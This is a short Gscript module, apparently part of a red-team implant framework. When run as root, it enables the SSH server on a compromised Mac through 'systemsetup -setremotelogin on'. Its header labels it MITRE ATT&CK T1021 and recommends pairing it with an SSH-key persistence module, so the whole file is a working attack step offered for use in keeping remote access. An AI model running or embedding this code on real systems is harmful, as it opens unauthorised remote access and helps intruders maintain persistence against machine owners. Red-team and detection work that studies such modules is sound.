// enable remote ssh
// Title: enable remote ssh
// Author: jayhill
// Purpose:To quickly turn on SSH server and allow incoming ssh connections to the current Mac.
// Gscript version: 1.0.0
// Tactic: Works really well when run w/ sshkey_persistence
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1021

//priority:130
//timeout:130

//go_import:os/user as user
  
  function Deploy() {  
    console.log("Enabling remoteSSH connection");

    //Ensure running as root
    var curUser = user.Current();
    console.log("Our user is: "+curUser[0].Username);
    if (curUser[0].Username == "root") {
        var execResp = G.exec.ExecuteCommand("systemsetup", ["-setremotelogin", "on"]);
        console.log("Pid: "+execResp[0]);
        console.log("stdout: "+execResp[1])
        console.log("stderr: "+execResp[2])
        console.log("exit code: "+execResp[3])
        if (execResp[4] != null) {
            console.log("go errors: "+Dump(execResp[4]))  
        }        
    } else {
        console.log("Not running as root!");
    }

    console.log("Done enable remoteSSH connection");
    return true;
  }